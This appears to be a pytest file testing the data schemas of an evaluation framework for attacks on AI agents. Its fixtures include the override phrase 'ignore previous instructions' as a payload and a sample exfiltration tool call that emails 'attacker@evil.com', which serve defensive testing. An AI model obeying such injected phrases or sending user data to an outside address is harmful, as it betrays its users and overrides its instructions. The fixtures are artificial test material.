"""Phase 1 schema tests: construction, validation bounds, and JSON round-trips."""

import json

import pytest
from pydantic import ValidationError

from agentic_security_eval.core.enums import (
    ASICategory,
    AttackSurface,
    EvidenceSource,
    Severity,
)
from agentic_security_eval.core.models import (
    AgentTrace,
    AttackCase,
    Capabilities,
    CategorySummary,
    Evidence,
    EvalReport,
    Finding,
    InterAgentMessage,
    JudgeDecision,
    MemoryEvent,
    Message,
    RetrievalEvent,
    TargetConfig,
    ToolCall,
)


def make_trace() -> AgentTrace:
    return AgentTrace(
        target_id="t1",
        run_id="run-1",
        attack_case_id="case-1",
        messages=[Message(id="m1", role="user", content="ignore previous instructions")],
        tool_calls=[
            ToolCall(id="tc1", tool_name="send_email", arguments={"to": "attacker@evil.com"})
        ],
        memory_events=[MemoryEvent(id="me1", operation="write", key="auth", value="bypass")],
        retrieval_events=[RetrievalEvent(id="re1", source="web", content="hidden instruction")],
        inter_agent_messages=[
            InterAgentMessage(id="ia1", from_agent="A", to_agent="B", content="leak it")
        ],
        final_output="done",
    )


def make_evidence() -> Evidence:
    return Evidence(
        id="ev1",
        source=EvidenceSource.TOOL_CALL,
        ref_id="tc1",
        snippet="send_email(to=attacker@evil.com)",
        locator="tool_calls[0]",
        reason="agent invoked exfiltration tool with attacker target",
    )


def make_finding() -> Finding:
    return Finding(
        id="f1",
        attack_case_id="case-1",
        category=ASICategory.ASI02,
        surface=AttackSurface.TOOL_OUTPUT,
        severity=Severity.HIGH,
        confidence=0.9,
        exploitability_score=0.8,
        is_vulnerable=True,
        evidence=[make_evidence()],
        explanation="agent followed injected tool instruction",
        recommendation="treat tool output as untrusted data",
    )


def test_models_construct_and_round_trip_json():
    config = TargetConfig(
        target_id="t1",
        adapter_type="python_workflow",
        entrypoint="pkg.module:factory",
        capabilities=Capabilities(tools=True, memory=True),
        allowed_surfaces=[AttackSurface.TOOL_OUTPUT, AttackSurface.MEMORY_WRITE],
    )
    case = AttackCase(
        id="case-1",
        category=ASICategory.ASI01,
        surface=AttackSurface.USER_PROMPT,
        objective="hijack the agent goal",
        payload="ignore previous instructions",
        expected_risk="agent abandons its task and follows injected instructions",
    )
    for model in (config, case, make_trace(), make_evidence(), make_finding()):
        restored = type(model).model_validate_json(model.model_dump_json())
        assert restored == model


@pytest.mark.parametrize("field", ["confidence", "exploitability_score"])
@pytest.mark.parametrize("bad_value", [-0.01, 1.01])
def test_judge_decision_rejects_out_of_range_scores(field, bad_value):
    kwargs = dict(
        is_vulnerable=True,
        category=ASICategory.ASI01,
        severity=Severity.HIGH,
        confidence=0.5,
        exploitability_score=0.5,
        evidence_ids=["ev1"],
        explanation="x",
        recommendation="y",
    )
    kwargs[field] = bad_value
    with pytest.raises(ValidationError):
        JudgeDecision(**kwargs)


@pytest.mark.parametrize("field", ["confidence", "exploitability_score"])
@pytest.mark.parametrize("bad_value", [-0.01, 1.01])
def test_finding_rejects_out_of_range_scores(field, bad_value):
    kwargs = dict(
        id="f1",
        attack_case_id="case-1",
        category=ASICategory.ASI02,
        surface=AttackSurface.TOOL_OUTPUT,
        severity=Severity.HIGH,
        confidence=0.5,
        exploitability_score=0.5,
        is_vulnerable=True,
        evidence=[make_evidence()],
        explanation="x",
        recommendation="y",
    )
    kwargs[field] = bad_value
    with pytest.raises(ValidationError):
        Finding(**kwargs)


def test_scores_accept_inclusive_boundaries():
    decision = JudgeDecision(
        is_vulnerable=False,
        category=ASICategory.ASI06,
        severity=Severity.INFO,
        confidence=0.0,
        exploitability_score=1.0,
        evidence_ids=[],
        explanation="",
        recommendation="",
    )
    assert decision.confidence == 0.0
    assert decision.exploitability_score == 1.0


def test_evidence_ref_id_grounds_in_trace_element():
    trace = make_trace()
    evidence = make_evidence()
    tool_call_ids = {tc.id for tc in trace.tool_calls}
    assert evidence.source == EvidenceSource.TOOL_CALL
    assert evidence.ref_id in tool_call_ids


def test_agent_trace_holds_all_event_types():
    trace = make_trace()
    assert [m.id for m in trace.messages] == ["m1"]
    assert [t.id for t in trace.tool_calls] == ["tc1"]
    assert [e.id for e in trace.memory_events] == ["me1"]
    assert [r.id for r in trace.retrieval_events] == ["re1"]
    assert [i.id for i in trace.inter_agent_messages] == ["ia1"]
    assert trace.final_output == "done"


def test_eval_report_serializes_to_json():
    report = EvalReport(
        report_id="r1",
        target_id="t1",
        total_cases=1,
        total_findings=1,
        tested_categories=[ASICategory.ASI02],
        tested_surfaces=[AttackSurface.TOOL_OUTPUT],
        findings=[make_finding()],
        category_summary={
            "ASI02": CategorySummary(total_cases=1, total_findings=1, by_severity={"high": 1})
        },
    )
    payload = report.model_dump_json()
    data = json.loads(payload)
    assert data["schema_version"] == "0.1.0"
    assert data["findings"][0]["evidence"][0]["ref_id"] == "tc1"
    assert EvalReport.model_validate_json(payload) == report
